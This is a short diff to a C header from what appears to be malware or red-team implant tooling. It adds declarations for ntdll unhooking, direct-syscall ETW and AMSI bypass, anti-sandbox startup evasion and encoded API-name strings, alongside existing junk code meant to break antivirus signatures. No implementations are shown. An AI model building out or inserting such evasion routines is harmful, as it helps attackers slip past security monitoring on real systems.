@@ -47,6 +47,20 @@ void obf_bypass_amsi(void);
 void obf_hide_thread(void);
 void obf_reflective_load(void);
 
+/* === Syscall Direct Invocation + Anti-Sandbox + Ntdll Unhooking === */
+void obf_unhook_ntdll(void);
+void obf_startup_evasion(void);
+void obf_sleep_obfuscated(DWORD milliseconds);
+void obf_bypass_etw_syscall(void);
+void obf_bypass_amsi_syscall(void);
+
+/* Encoded string accessors for ETW/AMSI */
+char* obf_etweventwrite(void);
+char* obf_amsiscanbuffer(void);
+char* obf_amsiinit(void);
+char* obf_amsidll(void);
+char* obf_ntsetinfothread(void);
+
 /* Junk code insertion to break signatures */
 void obf_junk_delay(void);
 void obf_sleep_junk(int ms);
